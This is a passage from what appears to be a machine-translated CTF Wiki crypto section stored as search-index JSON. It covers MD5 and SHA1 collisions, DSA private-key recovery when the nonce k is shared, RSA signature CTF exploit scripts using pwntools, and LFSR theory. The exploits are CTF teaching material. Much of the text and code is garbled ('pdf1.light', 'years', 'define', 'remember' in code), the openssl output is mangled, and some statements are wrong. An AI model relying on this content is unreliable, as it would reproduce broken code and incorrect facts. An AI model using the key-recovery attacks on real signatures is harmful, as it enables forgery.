eight bits.</p> <p>In general, we can determine whether it is an MD5 function by initializing the function. In general, if a function has the following four initialized variables, you can guess that the function is an MD5 function, because this is the initialization IV of the MD5 function.</p> <pre><code>0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476\n</code></pre>"},{"location":"crypto/hash/md5/#crack","title":"Crack","text":"<p>At present, it can be said that md5 has been basically broken. The general MD5 collision can be obtained on the following online.</p> <ul> <li> <p>http://www.cmd5.com/</p> </li> <li> <p>http://www.ttmd5.com/</p> </li> <li> <p>http://pmd5.com/</p> </li> <li> <p>https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip (generate md5 collision with the specified prefix)</p> </li> </ul>"},{"location":"crypto/hash/md5/#topic","title":"topic","text":"<ul> <li>CFF 2016 a lot of salt</li> <li>JarvisOJ a lot of salt</li> </ul>"},{"location":"crypto/hash/sha1/","title":"SHA1","text":""},{"location":"crypto/hash/sha1/#basic-description","title":"Basic description","text":"<p>The input and output of SHA1 are as follows</p> <ul> <li>Input: Any long message divided into 512 bits long packets. First, bit 1 is added to the right side of the message, and then a number of bits 0 are added until the bit length of the message satisfies the modulo remainder of 512, which is 448, which is congruent with 448 modulo 512.</li> <li>Output: 160-bit message digest.</li> </ul> <p>For a detailed introduction, please search for yourself.</p> <p>In general, we can determine whether the SHA1 function is through the initialization of the function. In general, if a function has the following five initialized variables, you can guess that the function is a SHA1 function, because this is the initialization IV of the SHA1 function.</p> <pre><code>0x67452301\n\n0xEFCDAB89\n\n0x98BADCFE\n\n0x10325476\n\n0xC3D2E1F0\n</code></pre> <p>The first four are similar to the MD5, and the latter are new.</p>"},{"location":"crypto/hash/sha1/#crack","title":"Crack","text":"<p>For now, SHA1 is no longer safe, because Google has previously published two pdfs with the same sha1 value, please refer to [shattered] (https://shattered.io/).</p> <p>There is also a more interesting website here: https://alf.nu/SHA1.</p>"},{"location":"crypto/hash/sha1/#2017-seccon-sha1-is-dead","title":"2017 SECCON SHA1 is dead","text":"<p>The title is described below</p> <ol> <li> <p>file1 != file2</p> </li> <li> <p>SHA1(file1) == SHA1(file2)</p> </li> <li> <p>SHA256(file1) &lt;&gt; SHA256(file2)</p> </li> <li> <p>2017KiB &lt; sizeof(file1) &lt; 2018KiB</p> </li> <li> <p>2017KiB &lt; sizeof(file2) &lt; 2018KiB</p> </li> </ol> <p>1KiB = 1024 bytes</p> <p>That is, we need to find two files that satisfy the above constraints.</p> <p>Here is the idea of Google's previously published documents, and, very importantly, as long as the given first 320 bytes, the hash added after adding the same byte is still the same, here we test the following</p> <pre><code>\u279c  2017_seccon_sha1_is_dead git:(master) dd bs=1 count=320 &lt;shattered-1.pdf| sha1sum\n\nRecorded the reading of 320+0\nRecorded the write of 320+0\n320 bytes copied, 0.00796817 s, 40.2 kB/s\n\nf92d74e3874587aaf443d1db961d4e26dde13e9c -\n\u279c  2017_seccon_sha1_is_dead git:(master) dd bs=1 count=320 &lt;shattered-2.pdf| sha1sum\n\nRecorded the reading of 320+0\nRecorded the write of 320+0\n320 bytes copied, 0.00397215 s, 80.6 kB/s\n\nf92d74e3874587aaf443d1db961d4e26dde13e9c -\n</code></pre> <p>Then we can write the program directly, as follows</p> <pre><code>from hashlib import sha1\n\nfrom hashlib import sha256\n\n\n\npdf1 = open('./shattered-1.pdf').read(320)\n\npdf2 = open('./shattered-2.pdf').read(320)\n\npdf1 = pdf1.ljust (2017 * 1024 + 1 - 320, &amp;quot;00&amp;quot;) #padding pdf to 2017Kib + 1\npdf2 = pdf2.light (2017 * 1024 + 1 - 320, &amp;quot;00&amp;quot;)\nopen(\"upload1\", \"w\").write(pdf1)\n\nopen(\"upload2\", \"w\").write(pdf2)\n\n\n\nprint sha1(pdf1).hexdigest()\n\nprint sha1(pdf2).hexdigest()\n\nprint sha256(pdf1).hexdigest()\n\nprint sha256(pdf2).hexdigest()\n</code></pre>"},{"location":"crypto/hash/sha1/#references","title":"references","text":"<ul> <li>https://www.slideshare.net/herumi/googlesha1</li> </ul>"},{"location":"crypto/signature/dsa/","title":"DSA","text":"<p>The ElGamal signature algorithm described above is not commonly used in practice, and its variant DSA is more commonly used.</p>"},{"location":"crypto/signature/dsa/#fundamental","title":"Fundamental","text":""},{"location":"crypto/signature/dsa/#key-generation","title":"Key Generation","text":"<ol> <li>Select a suitable hash function. Currently, SHA1 is generally selected. Currently, a stronger hash function H can be selected.</li> <li>Select the length L and N of the key, which determine the security of the signature. In the original DSS (Digital Signature Standard) it was suggested that L must be a multiple of 64, and 512 \\leq L \\leq 1024, of course, can be larger. The N must be no larger than the length of the hash function H output. FIPS 186-3 gives some suggested examples of L and N values: (1024, 160), (2048, 224), (2048, 256), and (3, 072, 256).</li> <li>Select the prime number q of N bits.</li> <li>Select the prime number p of L bits such that p-1 is a multiple of q.</li> <li>Select the g that satisfies the minimum positive integer k of g^k \\equiv 1 \\bmod p as q, ie g in the background of modulo p, ord(g)=q. That is, in the sense of modulo p, its exponential power can generate subgroups with q elements. Here, we can get g by calculating g=h^{\\frac{p-1}{q}} \\bmod p, where 1&lt; h &lt; p-1 .</li> <li>Select private key x, 0 &lt;x&lt;q \uff0c\u8ba1\u7b97y \\equiv g^x \\bmod p \u3002</li> </ol> <p>The public key is (p, q, g, y) and the private key is (x).</p>"},{"location":"crypto/signature/dsa/#signature","title":"Signature","text":"<p>The signature steps are as follows</p> <ol> <li>Select the random integer number k as the temporary key, 0 &lt;k&lt;q \u3002</li> <li>Calculate r\\equiv (g^k \\bmod p) \\bmod q</li> <li>Calculate s\\equiv (H(m)+xr)k^{-1} \\bmod q</li> </ol> <p>The result of the signature is (r, s). It should be noted that the important difference here with Elgamal is that the hash function is used to hash the message.</p>"},{"location":"crypto/signature/dsa/#verification","title":"Verification","text":"<p>The verification process is as follows</p> <ol> <li>Calculate the auxiliary value, w=s^{-1} \\bmod q</li> <li>Calculate the auxiliary value, u_1=H(m)w \\bmod q</li> <li>Calculate the auxiliary value, u_2=rw \\bmod q</li> <li>\u8ba1\u7b97 $ v = (g ^ y ^ {} {u_1 u_2}  way p)  $ q way</li> <li>If v is equal to r, the verification is successful.</li> </ol>"},{"location":"crypto/signature/dsa/#correctness-derivation","title":"Correctness derivation","text":"<p>First, g satisfies the minimum positive integer k of g^k \\equiv 1 \\bmod p as q. So g^q \\equiv 1 \\bmod p . So g^x \\equiv g^{x \\bmod q} \\bmod p . and then</p> <p>v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw}</p> <p>Also s\\equiv (H(m)+xr)k^{-1} \\bmod q and w=s^{-1} \\bmod q</p> <p>k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q</p> <p>So v \\equiv g^k . Correctness is proven.</p>"},{"location":"crypto/signature/dsa/#safety","title":"safety","text":""},{"location":"crypto/signature/dsa/#known-k","title":"Known k","text":""},{"location":"crypto/signature/dsa/#principle","title":"Principle","text":"<p>If we know the random key k, then we can calculate the private key d based on s\\equiv (H(m)+xr)k^{-1} \\bmod q, which almost breaks the DSA.</p> <p>In general, the hash value of the message will be given.</p> <p>x \\equiv r^{-1}(ks-H(m)) \\bmod q</p>"},{"location":"crypto/signature/dsa/#k","title":"k\u5206\u4eab","text":""},{"location":"crypto/signature/dsa/#principle_1","title":"Principle","text":"<p>If k is shared during the two signatures, we can attack.</p> <p>Suppose the signed message is m1, m2, obviously, the values of r are the same, in addition</p> <p>s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q</p> <p>s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q</p> <p>Here we don't know the rest except x and k, then</p> <p>s_1k \\equiv H(m_1)+xr</p> <p>s_2k \\equiv H(m_2)+xr</p> <p>Two-type subtraction</p> <p>k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q</p> <p>At this point, we can solve for k, and further we can solve x.</p>"},{"location":"crypto/signature/dsa/#example","title":"Example","text":"<p>Here we take the DSA of the Huxiang Cup as an example, but we can't do it directly, because we found that the signature did not pass when verifying message4. I have no source questions. , here I take the modified topic DSA in Jarvis OJ as an example.</p> <pre><code>\u279c 2016 Hunan Cup DSA git: (master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin packet1/message1\nVerified OK\n\n\u279c 2016 Hunan Cup DSA git: (master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message1\npacket2/message1: No such file or directory\n\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin  packet2/message2 \n\nVerified OK\n\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin  packet3/message3 \n\nVerified OK\n\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin  packet4/message4\n\nVerified OK\n</code></pre> <p>It can be seen that all four messages are verified. The reason why I think of sharing k here is because the title of the PS3 has been used to crack this method, from the online search can know the attack.</p> <p>Below, let's take a look at the signed value, the command used here is as follows</p> <pre><code>\u279c 2016 Huxiang Cup DSA git: (master) \u2717 openssl asn1parse -inform der -in packet4/sign4.bin\n    0:d=0  hl=2 l=  44 cons: SEQUENCE          \n\n2: d = 1 hl = 2 = 20 prime: INTEGER: 5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n   24:d=1  hl=2 l=  20 prim: INTEGER           :5E10DED084203CCBCEC3356A2CA02FF318FD4123\n\n\u279c 2016 Huxiang Cup DSA git: (master) \u2717 openssl asn1parse -inform der -in packet3/sign3.bin\n    0:d=0  hl=2 l=  44 cons: SEQUENCE          \n\n2: d = 1 hl = 2 = 20 prime: INTEGER: 5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n24: d = 1 hl = 2 l = 20 prim: INTEGER: 30EB88E6A4BFB1B16728A974210AE4E41B42677D\n\u279c 2016 Hunan Cup DSA git: (master) \u2717 openssl asn1parse -inform der -in packet2/sign2.bin\n    0:d=0  hl=2 l=  44 cons: SEQUENCE          \n\n2: d = 1 hl = 2 l = 20 prim: INTEGER: 60B9F2A5BA689B802942D667ED5D1EED066C5A7F\n24: d = 1 hl = 2 l = 20 prim: INTEGER: 3DC8921BA26B514F4D991A85482750E0225A15B5\n\u279c 2016 Hunan Cup DSA git: (master) \u2717 openssl asn1parse -inform der -in packet1/sign1.bin\n    0:d=0  hl=2 l=  45 cons: SEQUENCE          \n\n2: d = 1 hl = 2 l = 21 prim: INTEGER: 8158B477C5AA033D650596E93653C730D26BA409\n25: d = 1 hl = 2 l = 20 prim: INTEGER: 165B9DD1C93230C31111E5A4E6EB5181F990F702\n</code></pre> <p>Among them, the first value obtained is r, and the second value is s. You can see that the 4<sup>th</sup> packet and the 3<sup>rd</sup> packet share k because their r is the same.</p> <p>Here we can use openssl to see the public key</p> <pre><code>\u279c 2016 Hunan Cup DSA git: (master) \u2717 openssl dsa -in dsa_public.pem -text -noout -pubin\nread DSA key\n\npub: \n\n45: bb: 18: f6: 0e: b0: 51: f9: d4: 8c: d9: 56:\n    33:0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83:\n\n29: 2d: 95: c4: df: c8: ac: 26: c: 45: 2e: 17:\ne: 5c: c6: 15: 9e: 03: 7b: cc: f5: 64: ef: 36: 1c: 18: c9:\n: 9: 8: 1: 2: 1: 2: 1: 6: 1: 1: 6: 1: 1: 60: bb: 73: 0d: 60: bb: 73: 0: 60: 1: 2\n    11:f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a:\n\n6f: ac: it: 86: 65: 90: 06: d4: fa: f0: 57: 71: 68: 57: ec:\n7c: a6: 04: ad: e2: c3: d7: 31: d6: d0: 2f: 93: 31: 98: d3:\n90: c3: ef: c3: f3: ff: 04: 6f\nP:   \n\n    00:c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31:\n\n5e: e7: 0c: a6: b5: b1: 1a: 51: 9b: 55: 23: d4:\n45: 66: e2: 2c: c8: 8b: f: c5: 6a: ad: 66:\n    ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11:\n\n    84:be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38:\n\n3c: b4: a9: 54: b3: 7c: b5: 88: 67: 2f: 7c:\nf2: fa: 05: 38: fd: ad: 83: 93: 4a: 45: e4: f9: 9d: 38: from:\n    57:c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1:\n\n0c: e7: 57: 68: 90: b6: ba: 08: 9b\nQ:   \n\n00: 86: 8f: 78: b8: c8: 50: 0b: eb: f6: 7a: 58: e3:\n53: 9d: 35: 70: d1: bd\nG:   \n\n4c: d5: e6: b6: 6a: 6e: b7: e9: 27: 94:\ncb: 11: af: 5a: 08: d9: d4: f8: a3: f2: 50: 03: 72: 91: ba:\n5f: ff: 3c: 29: a8: c3: 7b: c4: ee: 5f: 98: ec: 17: f4: 18:\nbc: 71: 61: 01: 6c: 94: c8: 49: 02: e4: 00:\n    d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08:\n\n    cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07:\n\n9f: it: 12: 09: 8b: 34: 50: 84: 4: 2: 9e: 5d: 0A: 99: bd:\n86: 5: 05: 70: d5: 19: 7d: f4: a1: c9: b8: 01: 8f: b9: 9c:\ndc: e9: 15: 7b: 98: 50: 01: 79\n</code></pre> <p>Below, we can directly use the above principle to write a program, the program is as follows</p> <pre><code>#coding=utf8\n\nfrom Crypto.PublicKey import DSA\n\nfrom hashlib import sha1\n\nimport gmpy2\n\nwith open('./dsa_public.pem') as f:\n\n    key = DSA.importKey(f)\n\ny = key.y\n    g = key.g\n\n    p = key.p\n\n    q = key.q\n\nf3 = open(r\"packet3/message3\", 'r')\n\nf4 = open(r\"packet4/message4\", 'r')\n\ndata3 = f3.read ()\ndata4 = f4.read()\n\nSha = sha1()\nsha.update(data3)\n\nm3 = int (sha.hexdigest (), 16)\nSha = sha1()\nsha.update(data4)\n\nm4 = int (sha.hexdigest (), 16)\nprint m3, m4\ns3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677D\ns4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123\nr = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n\nds = s4 - s3\ndm = m4 - m3\nk = gmpy2.mul(dm, gmpy2.invert(ds, q))\n\nk = gmpy2.f_mod(k, q)\n\ntmp = gmpy2.mul (k, s3) - m3\nx = tmp * gmpy2.invert(r, q)\n\nx = gmpy2.f_mod(x, q)\n\nprint int(x)\n</code></pre> <p>** I found that pycrypto installed by pip does not have the importKey function of DSA. . . I had to download and install pycrypto from github. . . **</p> <p>Results are as follows</p> <pre><code>\u279c 2016 Huxiang Cup DSA git: (master) \u2717 python exp.py\n1104884177962524221174509726811256177146235961550 943735132044536149000710760545778628181961840230\n\n520793588153805320783422521615148687785086070744\n</code></pre>"},{"location":"crypto/signature/introduction/","title":"digital signature","text":"<p>In daily life, when we participate in an event, we may need to sign in order to prove that we are indeed present, and to prevent the leader from knowing, you know. . . But in fact, this signature is easy to be forged, just ask someone to sign it, or find someone who will imitate someone else's handwriting to help sign it. In the computer world, we may need an electronic signature, because most of the time we use electronic files, what should we do at this time? Of course, we can still choose to use our own name. But there is another way, that is, using digital signatures, which are more difficult to forge and more trustworthy. The primary use of digital signatures is to ensure that the message does come from the person who claims to have generated the message.</p> <p>Digital signatures are mainly used to sign digital messages in case of impersonation or falsification of messages, and can also be used for identity authentication of both parties.</p> <p>Digital signatures rely on asymmetric cryptography because we have to make sure that one party can do something while the other party cannot do something like this. The basic principle is as follows</p> <p></p> <p>Digital signatures should have the following characteristics:</p> <p>(1) The signature is credible: anyone can verify the validity of the signature.</p> <p>(2) Signatures are unforgeable: it is difficult for anyone else to falsify their signatures except for legitimate signers.</p> <p>(3) Signatures are not reproducible: the signature of one message cannot be changed to the signature of another message by copying. If the signature of a message is copied from elsewhere, anyone can discover the inconsistency between the message and the signature, so that the signed message can be rejected.</p> <p>(4) The signed message is immutable: the signed message cannot be tampered with. Once the signed message has been tampered with, anyone can discover the inconsistency between the message and the signature.</p> <p>(5) The signature is non-repudiation: the signer cannot deny his signature afterwards.</p>"},{"location":"crypto/signature/rsa/","title":"RSA Digital Signature","text":""},{"location":"crypto/signature/rsa/#principle","title":"Principle","text":"<p>The principle is similar to RSA encryption, except that the private key is used for encryption, and the encrypted result is used as a signature.</p>"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix1","title":"2018 Backdoor Awesome mix1","text":"<p>First, you can easily analyze the source code. Here, the program uses RSK signature with PKCS1_V1.5, which will extend the plaintext message. For specific extension rules, please refer to https://www.emc.com/collateral/white-papers/h11300-pkcs -1v2-2-rsa-cryptography-standard-wp.pdf. Here is the corresponding extension script, corresponding to the <code>from Util import PKCS1_pad as pad</code> in the title.</p> <pre><code>def PKCS1_pad(data):\n\n    asn1 = \"3021300906052b0e03021a05000414\"\n\nans = asn1 + data\nn = len (ans)\nreturn int ((&amp;#39;00&amp;#39; + &amp;#39;01&amp;#39; + &amp;#39;ff&amp;#39; * (1024/8 - n / 2 - 3) + &amp;#39;00&amp;#39; + years), 16)\n</code></pre> <p>The program wants us to give <code>n,e</code> to make the program satisfy</p> <p>h(m)^e mod \\ n=pad(m)</p> <p>Here we already know <code>h(m), pad(m)</code>. Obviously if we control <code>e=1</code>, then</p> <p>h(m)-pad(m)=kn</p> <p>Then if we can set k=1, we can get n.</p> <p>Local deployment <code>socat TCP4-LISTEN: 12345, fork EXEC:./mix1.py</code>.</p> <p>Exp is as follows</p> <pre><code>from Crypto.Hash import SHA\n\nfrom pwn import *\n\n\n\nfrom Util import PKCS1_pad\n\n\n\n#context.log_level = 'debug'\n\n\n\n\n\ndef main():\n\n    port = 12345\n\n    host = \"127.0.0.1\"\n\n    p = remote(host, port)\n\n    p.recvuntil('Message   -&gt; ')\n\n    message = p.recvuntil('\\n\\nSignature -&gt; ', drop=True)\n\n    log.info('message: ' + message)\n\n    signature = p.recvuntil('\\n', drop=True)\n\n    log.info('signature: ' + signature)\n\n\n\n    h = SHA.new(message)\n\n\n\n    m = PKCS1_pad(h.hexdigest())\n\n\n\ne = 1\n    n = int(signature, 16) - m\n\n\n\n    p.sendlineafter('Enter n:', str(n))\n\n    p.sendlineafter('Enter e:', str(e))\n\n\n\n    p.interactive()\n\n\n\n\n\nmain()\n</code></pre> <p>The effect is as follows</p> <pre><code>\u279c  2018-BackdoorCTF-Awesome-mix1 git:(master) python exp.py\n\n[+] Opening connection to 127.0.0.1 on port 12345: Done\n\n[*] message: super important information for admin only\n\n[*] signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f\n\n[*] Switching to interactive mode\n\nCTF{cryp70_5ur3_15_w13rd}\n\n[*] Got EOF while reading in interactive\n</code></pre>"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix2","title":"2018 Backdoor Awesome mix2","text":"<p>Local deployment <code>socat TCP4-LISTEN: 12345, fork EXEC:./service.py</code>.</p> <p>The topic is similar to the above question. The only difference is that there is a constraint on e, which must be greater than 3, so we can't use 1.</p> <p>h(m)^e mod \\ n=pad(m)</p> <p>Here we already know <code>h(m), pad(m)</code>. We only need to construct the remaining numbers. Here we construct n as a prime number, so that n-1 is a smooth number, so we can use the pohlig_hellman algorithm.</p> <pre><code>from Crypto.Hash import SHA\n\nfrom pwn import *\n\nimport gmpy2\n\nfrom gmpy2 import is_prime\n\nimport random\n\n\n\n\n\ndef PKCS1_pad(data):\n\n    asn1 = \"3021300906052b0e03021a05000414\"\n\nans = asn1 + data\nn = len (ans)\nreturn int ((&amp;#39;00&amp;#39; + &amp;#39;01&amp;#39; + &amp;#39;ff&amp;#39; * (1024/8 - n / 2 - 3) + &amp;#39;00&amp;#39; + years), 16)\n\n\n\n\n#context.log_level = 'debug'\n\ndef gen_smooth_num(plist, minnum=pow(2, 1020)):\n\nlenp = len (plist)\n    while True:\n\n        n = 1\n\n        factors = dict()\n\nwhile n + 1 &amp;lt;remember:\n            tmp = random.randint(0, lenp - 1)\n\n            n *= plist[tmp]\n\n            if plist[tmp] in factors:\n\n                factors[plist[tmp]] += 1\n\n            else:\n\n                factors[plist[tmp]] = 1\n\n        if n.bit_length() &gt; 1024:\n\n            continue\n\n        if is_prime(n + 1):\n\n            return n + 1, factors\n\n\n\n\n\n# http://pythonexample.com/snippet/pohligpy_neuratron_python\n\n# solve g^x=h mod m\n\ndefine log_prime_power (g, h, pf, pe, M):\n\n    powers = [pf**k for k in range(pe)]\n\n\n\n    gamma = gmpy2.powmod(g, powers[-1], M)\n\n\n\nxk = gmpy2.mpz (0)\n    for k in range(pe):\n\n        if k == 0:\n\nhk = gmpy2.powmod (h, powers [pe - k - 1], m)\n        else:\n\n            gk = gmpy2.powmod(g, xk * (M - 2), M)\n\nhk = gmpy2.powmod (gk * h, powers [pe - k - 1], m)\n\n\n        k_log_found = False\n\n        for dk in range(pf):\n\nyk = gmpy2.powmod (gamma, dk, M)\n            if yk == hk:\n\n                k_log_found = True\n\n                break\n\n\n\n        if not k_log_found:\n\n            raise Exception(\"can not solve\")\n\n\n\n        xk += gmpy2.mul(powers[k], dk)\n\n\n\n    return xk\n\n\n\n\n\ndef pohlig_hellman(g, h, M, factors):\n\n    M1 = M - 1\n\n    xs = []\n\n    for f in factors:\n\npf = f\npe = factors [f]\n\n\n        subgroup_exponent = gmpy2.div(M1, gmpy2.powmod(pf, pe, M))\n\n        gi = gmpy2.powmod(g, subgroup_exponent, M)\n\n        hi = gmpy2.powmod(h, subgroup_exponent, M)\n\n\n\nxi = log_prime_power (gi, hi, pf, pe, M)\n        xs.append(xi)\n\ncrt_coeffs = []\n\n\n    for f in factors:\n\npf = f\npe = factors [f]\n\n\nmi = pf ** on\n\n\nbi = gmpy2.div (M, mi)\nbi_inv = gmpy2.invert (bi, mi)\ncrt_coeffs.append (gmpy2.mul (bi, bi_inv))\n    x = 0\n\n    for i in range(len(crt_coeffs)):\n\n        x = gmpy2.t_mod(x + gmpy2.t_mod(xs[i] * crt_coeffs[i], M1), M1)\n\n    return x\n\n\n\n\n\n#context.log_level = 'debug'\n\n\n\n\n\ndef main():\n\n    port = 12345\n\n    host = \"127.0.0.1\"\n\n    p = remote(host, port)\n\n    p.recvuntil('Message   -&gt; ')\n\n    message = p.recvuntil('\\n\\nSignature -&gt; ', drop=True)\n\n    log.info('message: ' + message)\n\n    signature = p.recvuntil('\\n', drop=True)\n\n    log.info('signature: ' + signature)\n\n    signature = int(signature, 16)\n\n    h = SHA.new(message)\n\n\n\n    m = PKCS1_pad(h.hexdigest())\n\n    print m, signature\n\n    plist = []\n\n    for i in range(2, 1000):\n\n        if is_prime(i):\n\n            plist.append(i)\n\n    while True:\n\n        try:\n\n            n, factors = gen_smooth_num(plist, signature)\n\n            e = pohlig_hellman(signature, m, n, factors)\n\n        except Exception as e:\n\n            continue\n\n        else:\n\n            break\n\nprint n, e\n\n\n    print m\n\n    print gmpy2.powmod(signature, e, n)\n\n\n\n    p.sendlineafter('Enter n:', str(n))\n\n    p.sendlineafter('Enter e:', str(e))\n\n\n\n    p.interactive()\n\n\n\n\n\nmain()\n</code></pre> <p>There are two points to note</p> <ol> <li>Since both g and y in g^x=y are given, the newly found n, not necessarily the power of g, will contain y, so the solution may fail, so it needs to be solved multiple times. .</li> <li>Although <code>n.bit_length() &amp;lt;= 1025</code> in the source code, in fact, when n satisfies the condition of not less than signature, the following conditions must be met (pycrypto source code)</li> </ol> <pre><code>        modBits = Crypto.Util.number.size(self._key.n)\n\n        k = ceil_div(modBits,8) # Convert from bits to bytes\n\n\n\n        # Step 1\n\nif len (S)! = k:\n            return 0\n</code></pre> <p>So we'd better set n to 1024 bits.</p>"},{"location":"crypto/streamcipher/intro/","title":"\u6d41\u5bc6\u7801","text":"<p>Stream ciphers typically process information byte by byte or bit by bit. Generally speaking</p> <ul> <li>The key length of the stream cipher will be the same as the length of the plaintext.</li> <li>The key of the stream cipher is derived from a shorter key, and the derived algorithm is usually a pseudo-random number generation algorithm.</li> </ul> <p>It should be noted that stream encryption is currently symmetric encryption.</p> <p>The more random the sequence generated by the pseudo-random number generation algorithm, the better the statistical features in the plaintext are covered.</p> <p>Stream cipher encryption and decryption is very simple, and in the case of known plaintext, the key stream can be obtained very easily.</p> <p>The key to stream ciphers is the well-designed pseudo-random number generator. In general, the basic building block of a pseudo-random number generator is a feedback shift register. Of course, there are also some specially designed stream ciphers, such as RC4.</p>"},{"location":"crypto/streamcipher/fsr/intro/","title":"Feedback shift register","text":"<p>In general, an n-level feedback shift register is shown below</p> <p></p> <p>among them</p> <ul> <li>a_0, a_1,..., a_{n-1}, as initial.</li> <li>F is the feedback function or feedback logic. If F is a linear function, then we call it a linear feedback shift register (LFSR), otherwise we call it a nonlinear feedback shift register (NFSR).</li> <li>a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) \u3002</li> </ul> <p>In general, the feedback shift register is defined on a finite field to avoid the problem of too large and too small numbers. So we can think of it as a transformation in the same space, ie</p> <p>(a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n})</p> <p>.</p> <p>For a sequence, we generally define the sum of the power series whose generator function corresponds to its sequence.</p>"},{"location":"crypto/streamcipher/fsr/lfsr/","title":"Linear Feedback Shift Register - LFSR","text":""},{"location":"crypto/streamcipher/fsr/lfsr/#introduction","title":"Introduction","text":"<p>The feedback function of the linear feedback shift register is generally as follows</p> <p>a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j}</p> <p>Where c_j is in a finite field F_q.</p> <p>Since the linear space is a linear transformation, we can know that this linear transformation is</p>  \\left[ \\begin{matrix} 0   &amp; 0      &amp; \\cdots &amp; 0 &amp; c_n     \\\\ 1   &amp; 0      &amp; \\cdots &amp; 0 &amp; c_{n-1}  \\\\ 0   &amp; 1      &amp; \\cdots &amp; 0 &amp; c_{n-2}\\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0      &amp; \\cdots &amp; 1 &amp; c_1     \\\\ \\end{matrix} \\right]  <p>Furthermore, we can find the characteristic polynomial as</p> <p>$ f (x) = x ^ n-  sum  limit_ {i = 1} ^ {n} c_ix ^ {in} $</p> <p>At the same time, we define its reciprocal polynomial as</p> <p>\\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i}</p> <p>We also call the reciprocal polynomial as the joint polynomial of the linear feedback shift register.</p> <p>Here are some theorems that we need to remember. Interesting can be derived by ourselves.</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#characteristic-polynomial-and-generator","title":"Characteristic Polynomial and Generator","text":"<p>Knowing the characteristic polynomial of an n-level linear feedback shift register, then the corresponding generation function of the sequence is</p> <p>A(x)=\\frac{p(x)}{\\overline f(x)}</p> <p>Where p(x)=\\sum\\limits_{i=1}^{n}(c_{ni}x^{ni}\\sum\\limits_{j=1}^{i}a_jx^{j-1 }). It can be seen that p(x) is completely determined by the initial state and the coefficient of the feedback function.</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#sequence-cycle-and-generation-function","title":"Sequence cycle and generation function","text":"<p>The period of the sequence is the period of the denominator of the resulting true fraction of the function.</p> <p>For n-level linear feedback shift registers, the longest period is 2^{n-1} (excluding all zeros). The sequence that reaches the longest period is generally referred to as the m sequence.</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#special-nature","title":"Special nature","text":"<ul> <li>The two sequences are accumulated to give a new sequence whose period is the sum of the periods of the two sequences.</li> <li>The sequence is an n-level m sequence if and only if the minimal polynomial of the sequence is n primitive polynomials.</li> </ul>"},{"location":"crypto/streamcipher/fsr/lfsr/#bm-algorithm","title":"BM algorithm","text":"<p>In general, we can consider LFSR from two perspectives.</p> <ul> <li>Key generation angle. Generally, we want to use a LFSR with as low a level as possible to generate a sequence with a large period and good randomness.</li> <li>Cryptographic analysis, given a sequence a of length n, how to construct a LFSR with as few stages as possible to generate it. In fact, this is the source of the BM algorithm.</li> </ul> <p>In general, we define the linear complexity of a sequence as follows</p> <ul> <li>If s is an all-zero sequence, the linear complexity is zero.</li> <li>If no LFSR can generate s, the linear complexity is infinite.</li> <li>Otherwise, the linear complexity of s is the minimum level of LFSR that generates L(s).</li> </ul> <p>The requirements of the BM algorithm we need to know the sequence of length 2n. Complexity</p> <ul> <li>Time complexity: O(n^2) sub-bit operation</li> <li>Space complexity: O(n) bits.</li> </ul> <p>Details about the BM algorithm, added later, are currently in the learning process.</p> <p>But in fact, if we know the sequence of length 2n, we can also get a stupid way to get the original sequence. Let's assume that the known sequence is a_1,...,a_{2n}, we can make</p> <p>S_1=(a_1,...,a_n)</p> <p>S_2=(a_2,...,a_{n+1})</p> <p>....</p> <p>S_{n+1}=(a_{n+1},...,a_{2n})</p> <p>Then we can construct the matrix X=(S_1,...,S_n), then</p> <p>S_{n+1}=(c_n,...,c_1)X</p> <p>and so</p> <p>(c_n,...,c_1)=S_{n+1}X^{-1}</p> <p>Then we also know the feedback expression of the LFSR, and then we can introduce the initialization seed.</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-streamgame1","title":"2018 